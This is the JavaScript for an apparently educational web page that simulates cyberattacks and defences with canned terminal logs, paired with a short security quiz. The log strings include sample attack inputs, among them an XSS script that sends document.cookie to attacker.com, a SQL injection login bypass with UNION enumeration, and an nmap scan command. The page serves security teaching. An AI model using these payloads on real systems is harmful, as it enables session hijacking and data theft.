// Interactive Cybersecurity Red-Team Simulation Engine
// Curated by Cyber Security Expert Ratan Kumar Patel

// SIMULATOR STATE
let activeVector = 'ssh';
let firewallActive = false;
let isSimulating = false;
let simInterval = null;
let currentLogIndex = 0;
let speedMs = 50; // Milliseconds per log stream line
let rxPackets = 0;
let txPackets = 0;

// QUIZ GAME STATE
let currentQuestionIndex = 0;
let quizScore = 0;

// TERMINAL LOG TIMELINES (Offensive vs Defensive Streams)
const logDatabase = {
  ssh: {
    name: "SSH Dictionary Attack",
    severity: "CRITICAL",
    target: "SSH_SERVER_NODE_22",
    unprotected: [
      "[17:42:01] [INFO] Target SSH port identified open: 192.168.45.102:22",
      "[17:42:03] [ATTACK] Running Hydra dictionary scanning using rockyou.txt (500 credentials)...",
      "[17:42:05] [TRY] Authenticating user: admin | password: password123 -> ACCESS DENIED",
      "[17:42:07] [TRY] Authenticating user: root | password: admin123 -> ACCESS DENIED",
      "[17:42:09] [TRY] Authenticating user: user1 | password: password -> ACCESS DENIED",
      "[17:42:10] [TRY] Authenticating user: developer | password: projects -> ACCESS DENIED",
      "[17:42:12] [TRY] Authenticating user: administrator | password: admin@123 -> ACCESS DENIED",
      "[17:42:14] [TRY] Authenticating user: root | password: shadow789 -> SUCCESS",
      "[17:42:16] [COMPROMISE] Shell connection spawned successfully on Target Port 22!",
      "[17:42:18] [EXPLOIT] Uploading linpeas.sh privilege escalation scanner...",
      "[17:42:20] [ENUM] Running automated kernel privilege scan... Vulnerable to DirtyPipe (CVE-2022-0847).",
      "[17:42:22] [EXPLOIT] Launching exploit code... Local privilege escalation successful.",
      "[17:42:24] [SUCCESS] ROOT access achieved! Dumping shadow passwords database...",
      "[17:42:26] [ALERT] Session finished. Attacker exfiltrated 48 database hash values.",
      "[17:42:27] [COMPROMISE] SYSTEM COMPROMISED. Root access token captured."
    ],
    protected: [
      "[17:42:01] [INFO] Target SSH port identified open: 192.168.45.102:22",
      "[17:42:03] [ATTACK] Running Hydra dictionary scanning using rockyou.txt...",
      "[17:42:05] [TRY] Authenticating user: admin | password: password123 -> ACCESS DENIED",
      "[17:42:07] [TRY] Authenticating user: root | password: admin123 -> ACCESS DENIED",
      "[17:42:09] [IDS] Intrusion Detection flagged 3 failed auth attempts in <10s (Sig ID: 200341).",
      "[17:42:11] [FIREWALL] Fail2Ban action triggered: Source IP 192.168.45.2 blocked automatically.",
      "[17:42:13] [FIREWALL] Appending iptables rule: DROP input from 192.168.45.2 on Port 22.",
      "[17:42:15] [BLOCKED] Attacker request: root | password: user -> TIMEOUT",
      "[17:42:17] [BLOCKED] Attacker socket connection rejected by firewall filters.",
      "[17:42:19] [INTRUSION_PREVENTED] Attack vector permanently blocked. Target integrity protected."
    ]
  },
  sqli: {
    name: "SQL Injection (SQLi)",
    severity: "HIGH",
    target: "WEB_APPLICATION_443",
    unprotected: [
      "[17:44:10] [INFO] Target parameter found: /login.php [HTTP POST: user_id]",
      "[17:44:11] [ATTACK] Injecting bypass payload: admin' OR '1'='1' --",
      "[17:44:13] [QUERY] Backend Query: SELECT * FROM admin_users WHERE username = 'admin' OR '1'='1' --' AND pass=''",
      "[17:44:15] [SUCCESS] Database syntax bypassed! Authentication bypassed successfully.",
      "[17:44:17] [EXPLOIT] Injecting database schema enumeration payload via UNION SELECT...",
      "[17:44:19] [QUERY] Query: UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables...",
      "[17:44:21] [DATA] Leaked Schema: [tbl_admins, tbl_customer_cards, tbl_session_keys]",
      "[17:44:23] [EXPLOIT] Injecting data exfiltration payload against tbl_customer_cards...",
      "[17:44:25] [DATA] Leaked 150 rows. Raw credit card data, salt hashes, and cardholder names hijacked.",
      "[17:44:27] [SUCCESS] Injection run complete. Outbound HTTP tunnels successfully closed."
    ],
    protected: [
      "[17:44:10] [INFO] Target parameter found: /login.php [HTTP POST: user_id]",
      "[17:44:11] [ATTACK] Injecting bypass payload: admin' OR '1'='1' --",
      "[17:44:13] [WAF] Web Application Firewall intercepted request before database routing.",
      "[17:44:15] [WAF] SQL injection signature MATCHED (OWASP Rule #942100: SQL Hex Escape).",
      "[17:44:17] [IDS] Flagging threat pattern: High density database escape sequences in payload.",
      "[17:44:19] [FIREWALL] Null-routing source IP: 192.168.45.2 on Port 443 for 3600 seconds.",
      "[17:44:21] [HTTP] Terminating request with Status Code: 403 Forbidden.",
      "[17:44:23] [BLOCKED] Malicious SQL payload successfully dropped. Zero database interaction occurred."
    ]
  },
  xss: {
    name: "Cross-Site Scripting",
    severity: "MEDIUM",
    target: "WEB_PORTAL_443",
    unprotected: [
      "[17:46:30] [INFO] Target reflected form element found: /search.php?query=[input]",
      "[17:46:31] [ATTACK] Injecting Reflected XSS script: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
      "[17:46:33] [RENDER] Target page echoing payload back onto HTML response stream directly.",
      "[17:46:35] [EXECUTION] Reflected JavaScript executing in visitor browser security scope.",
      "[17:46:37] [SUCCESS] Administrator's PHP session cookie successfully hijacked and sent outbound!",
      "[17:46:39] [DATA] Captured cookie token: PHPSESSID=9a8bc47e30da2d17c91fae",
      "[17:46:41] [EXPLOIT] Launching automated administrative session impersonation attack...",
      "[17:46:43] [SUCCESS] Impersonation completed. Attacker logged in as Portal Administrator.",
      "[17:46:45] [COMPROMISE] Admin controls hijacked. Arbitrary configuration files successfully modified."
    ],
    protected: [
      "[17:46:30] [INFO] Target reflected form element found: /search.php?query=[input]",
      "[17:46:31] [ATTACK] Injecting Reflected XSS script: <script>...</script>",
      "[17:46:33] [WAF] Cross-Site Scripting protection filters engaged.",
      "[17:46:35] [WAF] Script elements detected. Sanitization triggered: '<script>' replaced with HTML entities '&lt;script&gt;'.",
      "[17:46:37] [HTTP] Response delivered containing CSP headers: 'Content-Security-Policy: default-src 'self''",
      "[17:46:39] [BROWSER] Browser engine enforced CSP rule: Blocked execution of inline malicious script.",
      "[17:46:41] [BLOCKED] Injection neutralized. Session session tokens remained encrypted & protected."
    ]
  },
  nmap: {
    name: "Full Network Port Scan",
    severity: "LOW",
    target: "INTEGRATED_NETWORK_ROUTER",
    unprotected: [
      "[17:48:01] [INFO] Launching Stealth SYN Scan: nmap -sS -sV -O -p- 192.168.45.102",
      "[17:48:03] [SCAN] Scanning 65,535 TCP ports concurrently using 256 parallel sockets...",
      "[17:48:05] [PORT] TCP Port 22 (SSH) -> OPEN (Banner: OpenSSH 8.2p1 Ubuntu)",
      "[17:48:07] [PORT] TCP Port 80 (HTTP) -> OPEN (Banner: Apache httpd 2.4.41)",
      "[17:48:09] [PORT] TCP Port 443 (HTTPS) -> OPEN (Banner: Apache httpd 2.4.41)",
      "[17:48:11] [PORT] TCP Port 3306 (MySQL) -> OPEN (Banner: MySQL 8.0.19)",
      "[17:48:13] [OS] Running TCP stack analysis... OS Fingerprint matched: Linux Kernel 5.4 (Ubuntu)",
      "[17:48:15] [VULN] Script run: MySQL service is running with insecure credentials allowed (blank root).",
      "[17:48:17] [SUCCESS] Scan complete. Vulnerability map generated and saved as targets.xml."
    ],
    protected: [
      "[17:48:01] [INFO] Launching Stealth SYN Scan: nmap -sS -sV -O -p- 192.168.45.102",
      "[17:48:03] [SCAN] Scanning port range 1-100...",
      "[17:48:05] [IDS] Intrusion Detection flagged: Rapid Port Scanning Scan footprint (Sig ID: 10092).",
      "[17:48:07] [IDS] IP 192.168.45.2 identified as scanner node source.",
      "[17:48:09] [FIREWALL] Null-routing automated. Blocking attacker IP 192.168.45.2 globally.",
      "[17:48:11] [BLOCKED] Incoming scanning packets dropped by firewall. Socket connections refused.",
      "[17:48:13] [TIMEOUT] Remaining 65,435 ports timed out. Network host successfully cloaked."
    ]
  }
};

// QUIZ QUESTIONS DATABASE
const quizDatabase = [
  {
    tag: "OWASP Vulnerability Analysis",
    question: "Which security header is primarily used to mitigate Reflected Cross-Site Scripting (XSS) attacks by instructing the browser to only load resources from trusted domains?",
    options: [
      { label: "A: Strict-Transport-Security (HSTS)", isCorrect: false },
      { label: "B: Content-Security-Policy (CSP)", isCorrect: true },
      { label: "C: Access-Control-Allow-Origin (CORS)", isCorrect: false },
      { label: "D: X-Frame-Options (XFO)", isCorrect: false }
    ],
    feedback: "Correct! Content-Security-Policy (CSP) is a highly powerful header. Ratan's tip: Setting 'default-src 'self'' restricts browsers to local resources, blocking third-party payload script injections completely!"
  },
  {
    tag: "Ethical Hacking & Web Security",
    question: "When auditing database queries, you discover parameters are concatenated directly. What is the most effective way to eliminate SQL Injection?",
    options: [
      { label: "A: Implement Prepared Statements & Parameterized Queries", isCorrect: true },
      { label: "B: Encrypt all database tables at rest", isCorrect: false },
      { label: "C: Move database MySQL port from 3306 to 9000", isCorrect: false },
      { label: "D: Implement a weekly offline backup schedule", isCorrect: false }
    ],
    feedback: "Correct! Prepared statements compile the query template first. Ratan's tip: Since parameters are bound as data literals, the SQL interpreter never executes injection payloads even if they contain escape characters!"
  },
  {
    tag: "Network Exploitation & Red Teaming",
    question: "A malicious actor deploys a rogue wireless access point mimicking a hotel's official Wi-Fi portal. Connecting users have their passwords captured. What is this attack?",
    options: [
      { label: "A: Phishing Payload Delivery", isCorrect: false },
      { label: "B: Ransomware Distribute Attempt", isCorrect: false },
      { label: "C: Evil Twin / Man-In-The-Middle (MITM) Attack", isCorrect: true },
      { label: "D: Denial of Service (DDoS) Scan", isCorrect: false }
    ],
    feedback: "Correct! An Evil Twin intercepts wireless traffic. Ratan's tip: Always utilize a premium VPN on public networks, look for HSTS indicators, and avoid auto-connecting to open Wi-Fi access points."
  }
];

// INITIALIZATION
document.addEventListener("DOMContentLoaded", () => {
  setupVectorSelectors();
  setupControls();
  renderQuizQuestion();
  
  // Connect range input indicator
  const speedSlider = document.getElementById("sim-speed");
  const speedText = document.getElementById("speed-val");
  speedSlider.addEventListener("input", (e) => {
    speedMs = parseInt(e.target.value);
    speedText.textContent = `${speedMs}ms/log`;
  });
});

// VECTOR CARDS SETUP
function setupVectorSelectors() {
  const cards = document.querySelectorAll(".vector-card");
  cards.forEach(card => {
    // Set initial active card
    if (card.getAttribute("data-vector") === activeVector) {
      card.classList.add("active");
      card.style.borderColor = "rgba(16, 185, 129, 0.4)";
      card.style.background = "rgba(16, 185, 129, 0.05)";
    }

    card.addEventListener("click", () => {
      if (isSimulating) {
        appendTerminalLine("[SYSTEM-ERROR] Cannot swap attack vector while simulation is running. Please stop current execution first.");
        return;
      }
      
      // Update states
      cards.forEach(c => {
        c.classList.remove("active");
        c.style.borderColor = "";
        c.style.background = "";
      });
      activeVector = card.getAttribute("data-vector");
      card.classList.add("active");
      
      // Apply correct glow styling based on vector threat color
      let colorGlow = "rgba(16, 185, 129, 0.4)"; // SQLi green
      let bgGlow = "rgba(16, 185, 129, 0.05)";
      if (activeVector === 'ssh') { colorGlow = "rgba(245, 158, 11, 0.4)"; bgGlow = "rgba(245, 158, 11, 0.05)"; }
      if (activeVector === 'xss') { colorGlow = "rgba(239, 68, 68, 0.4)"; bgGlow = "rgba(239, 68, 68, 0.05)"; }
      if (activeVector === 'nmap') { colorGlow = "rgba(6, 182, 212, 0.4)"; bgGlow = "rgba(6, 182, 212, 0.05)"; }
      
      card.style.borderColor = colorGlow;
      card.style.background = bgGlow;
      
      // Reset indicators
      updateTargetNodeBanners();
      appendTerminalLine(`\n[INFO] Selected vector changed to: ${logDatabase[activeVector].name}. Readiness confirmed.`);
    });
  });
}

// SETUP TOGGLES & RUN BUTTONS
function setupControls() {
  const fwToggle = document.getElementById("firewall-toggle");
  const runBtn = document.getElementById("run-btn");
  const resetBtn = document.getElementById("reset-btn");
  
  // Sync firewall toggle
  fwToggle.addEventListener("change", (e) => {
    firewallActive = e.target.checked;
    const fwIndicator = document.getElementById("fw-indicator");
    const shieldIcon = document.getElementById("shield-icon");
    const termWrapper = document.getElementById("terminal-wrapper");
    const scanlineInd = document.getElementById("scanline-indicator");

    if (firewallActive) {
      fwIndicator.textContent = "SHIELD_ACTIVE";
      fwIndicator.className = "font-bold text-cyan-400";
      shieldIcon.className = "fa-solid fa-shield-halved text-cyan-400 animate-pulse";
      appendTerminalLine("[FIREWALL-ALERT] Web Application Firewall (WAF) and IDS Shield enabled. Threat patterns actively filtered.");
      
      // Update terminal box shadow color
      termWrapper.className = termWrapper.className.replace(/glow-\w+/g, "");
      termWrapper.classList.add("glow-cyan");
      scanlineInd.className = "absolute inset-0 scanline-animation pointer-events-none opacity-40";
    } else {
      fwIndicator.textContent = "SHIELD_DOWN";
      fwIndicator.className = "font-bold text-red-500 animate-pulse";
      shieldIcon.className = "fa-solid fa-shield-cat text-gray-400";
      appendTerminalLine("[SECURITY-WARNING] Security Shield disabled. Port defenses vulnerable to OWASP exploitation vectors.");
      
      // Reset terminal box shadow color
      termWrapper.className = termWrapper.className.replace(/glow-\w+/g, "");
      termWrapper.classList.add("glow-red");
      scanlineInd.className = "absolute inset-0 scanline-animation-red pointer-events-none opacity-40";
    }
  });

  // Run simulation
  runBtn.addEventListener("click", () => {
    if (isSimulating) {
      stopSimulation();
    } else {
      startSimulation();
    }
  });

  // Reset console
  resetBtn.addEventListener("click", () => {
    stopSimulation();
    const terminal = document.getElementById("terminal-body");
    terminal.innerHTML = `
      <div class="text-gray-500 mb-2"># Ratan's Ethical Hacking Lab Initialized.</div>
      <div class="text-gray-500 mb-2"># Status: Ready to receive vector streams.</div>
      <div class="text-gray-500 mb-4"># Select a penetration scenario on the left and click 'Initiate Attack Run'.</div>
      <div class="text-emerald-400 cursor-blink font-bold">ratan-patel@cybersec_lab:~$</div>
    `;
    rxPackets = 0;
    txPackets = 0;
    updateTargetNodeBanners();
    updatePacketCounters();
  });
}

// UPDATE MONITORS & BANNERS
function updateTargetNodeBanners() {
  const currentVector = logDatabase[activeVector];
  document.getElementById("node-name").textContent = currentVector.target;
  document.getElementById("severity-indicator").textContent = currentVector.severity;
  
  // Style severity indicator text based on severity threat level
  const sevEl = document.getElementById("severity-indicator");
  sevEl.className = "font-bold";
  if (currentVector.severity === "CRITICAL") sevEl.classList.add("text-rose-500");
  else if (currentVector.severity === "HIGH") sevEl.classList.add("text-amber-500");
  else if (currentVector.severity === "MEDIUM") sevEl.classList.add("text-cyan-400");
  else sevEl.classList.add("text-gray-400");
}

function updatePacketCounters() {
  document.getElementById("packet-counter").textContent = `${rxPackets} rx / ${txPackets} tx`;
}

// SIMULATION ENGINE LOOPS
function startSimulation() {
  isSimulating = true;
  currentLogIndex = 0;
  
  // UI adjustments
  const runBtn = document.getElementById("run-btn");
  runBtn.innerHTML = `<i class="fa-solid fa-circle-stop"></i> Terminate Attack Run`;
  runBtn.className = runBtn.className.replace("bg-emerald-600", "bg-rose-600").replace("hover:bg-emerald-500", "hover:bg-rose-500");
  
  // Set terminal status indicator to active
  const statusInd = document.getElementById("status-indicator");
  const statusDot = document.getElementById("status-dot");
  const statusDotPing = document.getElementById("status-dot-ping");
  
  statusInd.textContent = "ATTACK IN PROGRESS";
  statusInd.className = "text-xs font-mono font-bold tracking-wider text-amber-500 uppercase";
  statusDot.className = "relative inline-flex rounded-full h-2 w-2 bg-amber-500";
  statusDotPing.className = "animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75";

  updateTargetNodeBanners();
  appendTerminalLine(`\n[SYSTEM] Triggering cyber simulation pipeline: ${logDatabase[activeVector].name}...`);

  const activeTimeline = firewallActive 
    ? logDatabase[activeVector].protected 
    : logDatabase[activeVector].unprotected;

  simInterval = setInterval(() => {
    if (currentLogIndex < activeTimeline.length) {
      appendTerminalLine(activeTimeline[currentLogIndex]);
      currentLogIndex++;
      
      // Increment network packets
      rxPackets += Math.floor(Math.random() * 8) + 3;
      txPackets += Math.floor(Math.random() * 6) + 2;
      updatePacketCounters();
    } else {
      // Completed log simulation
      stopSimulation();
      
      // Finish status indicator checks
      if (firewallActive) {
        statusInd.textContent = "THREATS MITIGATED";
        statusInd.className = "text-xs font-mono font-bold tracking-wider text-cyan-400 uppercase";
        statusDot.className = "relative inline-flex rounded-full h-2 w-2 bg-cyan-400";
        statusDotPing.className = "animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-300 opacity-75";
      } else {
        statusInd.textContent = "NODE COMPROMISED";
        statusInd.className = "text-xs font-mono font-bold tracking-wider text-red-500 uppercase animate-pulse";
        statusDot.className = "relative inline-flex rounded-full h-2 w-2 bg-red-500";
        statusDotPing.className = "animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75";
      }
    }
  }, speedMs * 10); // Factor of speedMs
}

function stopSimulation() {
  isSimulating = false;
  if (simInterval) clearInterval(simInterval);
  
  const runBtn = document.getElementById("run-btn");
  runBtn.innerHTML = `<i class="fa-solid fa-play"></i> Initiate Attack Run`;
  runBtn.className = runBtn.className.replace("bg-rose-600", "bg-emerald-600").replace("hover:bg-rose-500", "hover:bg-emerald-500");
  
  // Set terminal back to default online
  const statusInd = document.getElementById("status-indicator");
  const statusDot = document.getElementById("status-dot");
  const statusDotPing = document.getElementById("status-dot-ping");
  
  if (statusInd.textContent === "ATTACK IN PROGRESS") {
    statusInd.textContent = "SYSTEMS ONLINE";
    statusInd.className = "text-xs font-mono font-bold tracking-wider text-emerald-400 uppercase";
    statusDot.className = "relative inline-flex rounded-full h-2 w-2 bg-emerald-500";
    statusDotPing.className = "animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75";
  }
}

// APPEND DATA TO CRT MONITOR
function appendTerminalLine(text) {
  const terminal = document.getElementById("terminal-body");
  
  // Remove cursor before adding new log line
  const oldCursor = terminal.querySelector(".cursor-blink");
  if (oldCursor) oldCursor.classList.remove("cursor-blink", "font-bold");

  const line = document.createElement("div");
  line.className = "leading-relaxed py-0.5";
  
  // Check log severity for formatting
  if (text.includes("[COMPROMISE]")) {
    line.className += " text-red-500 font-extrabold shadow-sm bg-red-950/20 px-1 rounded border border-red-900/30";
  } else if (text.includes("[WAF]") || text.includes("[FIREWALL]") || text.includes("[BLOCKED]")) {
    line.className += " text-cyan-400 font-bold bg-cyan-950/20 px-1 rounded border border-cyan-800/20";
  } else if (text.includes("[SUCCESS]")) {
    line.className += " text-emerald-400 font-bold";
  } else if (text.includes("[TRY]") || text.includes("[TRYING]")) {
    line.className += " text-amber-500";
  } else if (text.includes("[SYSTEM-ERROR]")) {
    line.className += " text-rose-500 font-bold animate-pulse";
  } else if (text.includes("[INFO]")) {
    line.className += " text-blue-400";
  } else if (text.includes("[SCAN]")) {
    line.className += " text-purple-400";
  } else {
    line.className += " text-gray-300";
  }
  
  line.textContent = text;
  terminal.appendChild(line);

  // Re-add blink cursor line at bottom
  const cursorLine = document.createElement("div");
  cursorLine.className = "text-emerald-400 cursor-blink font-bold pt-1";
  cursorLine.textContent = "ratan-patel@cybersec_lab:~$";
  terminal.appendChild(cursorLine);

  // Auto-scroll to bottom of terminal
  terminal.scrollTop = terminal.scrollHeight;
}


// QUIZ LOGIC INTERACTIVITY
function renderQuizQuestion() {
  const currentQ = quizDatabase[currentQuestionIndex];
  
  // Elements
  document.getElementById("quiz-tag").textContent = currentQ.tag;
  document.getElementById("quiz-question").textContent = currentQ.question;
  document.getElementById("quiz-progress").textContent = `${currentQuestionIndex + 1} / ${quizDatabase.length}`;
  
  const optionsGrid = document.getElementById("quiz-options");
  optionsGrid.innerHTML = ""; // Clear existing options
  
  currentQ.options.forEach((opt, idx) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "w-full text-left p-3.5 bg-gray-900 hover:bg-gray-800 text-gray-300 border border-gray-800 hover:border-gray-700 rounded-xl transition duration-150 focus:outline-none cursor-pointer flex items-center justify-between group";
    btn.innerHTML = `
      <span>${opt.label}</span>
      <i class="fa-regular fa-circle text-gray-700 group-hover:text-gray-500 transition"></i>
    `;
    
    btn.addEventListener("click", () => handleQuizSubmission(idx, btn));
    optionsGrid.appendChild(btn);
  });
  
  // Hide next button again
  document.getElementById("quiz-next-btn").classList.add("hidden");
}

function handleQuizSubmission(selectedIndex, selectedBtn) {
  const currentQ = quizDatabase[currentQuestionIndex];
  const optionsButtons = document.getElementById("quiz-options").children;
  
  // Deactivate further clicks on this question
  for (let btn of optionsButtons) {
    btn.disabled = true;
    btn.style.cursor = "not-allowed";
  }
  
  const isCorrect = currentQ.options[selectedIndex].isCorrect;
  const feedbackEl = document.getElementById("quiz-feedback");
  
  if (isCorrect) {
    // Add point
    quizScore += 100;
    document.getElementById("quiz-score").textContent = `${quizScore} pts`;
    
    // Highlight correct button
    selectedBtn.className = "w-full text-left p-3.5 bg-emerald-950/80 text-emerald-400 border border-emerald-500/40 rounded-xl transition focus:outline-none flex items-center justify-between font-bold";
    selectedBtn.innerHTML = `
      <span>${currentQ.options[selectedIndex].label}</span>
      <i class="fa-solid fa-circle-check text-emerald-500 text-base animate-bounce"></i>
    `;
    
    // Set feedback
    feedbackEl.textContent = `Excellent work! ${currentQ.feedback}`;
    feedbackEl.className = feedbackEl.className.replace("text-gray-400", "text-emerald-400").replace("text-rose-400", "text-emerald-400");
  } else {
    // Highlight incorrect button
    selectedBtn.className = "w-full text-left p-3.5 bg-rose-950/80 text-rose-400 border border-rose-500/40 rounded-xl transition focus:outline-none flex items-center justify-between font-bold";
    selectedBtn.innerHTML = `
      <span>${currentQ.options[selectedIndex].label}</span>
      <i class="fa-solid fa-circle-xmark text-rose-500 text-base"></i>
    `;
    
    // Highlight the correct answer anyway for educational purposes
    currentQ.options.forEach((opt, idx) => {
      if (opt.isCorrect) {
        optionsButtons[idx].className = "w-full text-left p-3.5 bg-gray-950 border border-emerald-500/30 text-emerald-500/80 rounded-xl transition focus:outline-none flex items-center justify-between";
        optionsButtons[idx].innerHTML = `
          <span>${opt.label}</span>
          <i class="fa-regular fa-circle-check text-emerald-500/50"></i>
        `;
      }
    });
    
    // Set feedback
    feedbackEl.textContent = `Oops, that's not quite right. Instructor Ratan says: Let's analyze it! ${currentQ.feedback}`;
    feedbackEl.className = feedbackEl.className.replace("text-gray-400", "text-rose-400").replace("text-emerald-400", "text-rose-400");
  }
  
  // Unhide next button
  const nextBtn = document.getElementById("quiz-next-btn");
  nextBtn.classList.remove("hidden");
  
  // Connect next button click
  nextBtn.onclick = () => {
    currentQuestionIndex++;
    if (currentQuestionIndex < quizDatabase.length) {
      renderQuizQuestion();
      feedbackEl.textContent = `Instructor Ratan: Keep it up! Let's examine the next challenge!`;
      feedbackEl.className = "bg-gray-950/50 p-4 rounded-lg border border-gray-800/30 font-mono text-xs text-gray-400 leading-relaxed min-h-[140px]";
    } else {
      // Completed all questions
      const quizPanel = document.getElementById("quiz-options");
      quizPanel.innerHTML = `
        <div class="text-center py-6 space-y-4">
          <i class="fa-solid fa-trophy text-amber-400 text-5xl animate-bounce"></i>
          <div class="space-y-1">
            <h4 class="text-lg font-bold text-white">Interactive Training Completed!</h4>
            <p class="text-sm text-gray-400">You earned a final score of <strong class="text-emerald-400 font-mono">${quizScore} / 300 points</strong>.</p>
          </div>
          <button onclick="resetTrainingQuiz()" class="px-4 py-2 bg-gray-800 hover:bg-gray-700 text-gray-200 border border-gray-700/60 rounded-xl text-xs transition font-semibold cursor-pointer">
            Restart Quiz Sandbox
          </button>
        </div>
      `;
      nextBtn.classList.add("hidden");
      feedbackEl.textContent = `Instructor Ratan: Outstanding effort! You completed my ethical hacking training sandbox. If you want to dive deeper into practical labs, CTF challenges, or learn VAPT from the ground up, let's get connected! I'm available for corporate training programs and immediate joining roles.`;
      feedbackEl.className = "bg-gray-950/50 p-4 rounded-lg border border-gray-800/30 font-mono text-xs text-emerald-400 leading-relaxed min-h-[140px]";
    }
  };
}

// RESET QUIZ EXPLICITLY
window.resetTrainingQuiz = function() {
  currentQuestionIndex = 0;
  quizScore = 0;
  document.getElementById("quiz-score").textContent = "0 pts";
  renderQuizQuestion();
  const feedbackEl = document.getElementById("quiz-feedback");
  feedbackEl.textContent = "Hi there! Complete the interactive questions above. I'll provide you with specialized red-team training insights and CEH defense tips for every choice you make!";
  feedbackEl.className = "bg-gray-950/50 p-4 rounded-lg border border-gray-800/30 font-mono text-xs text-gray-400 leading-relaxed min-h-[140px]";
};
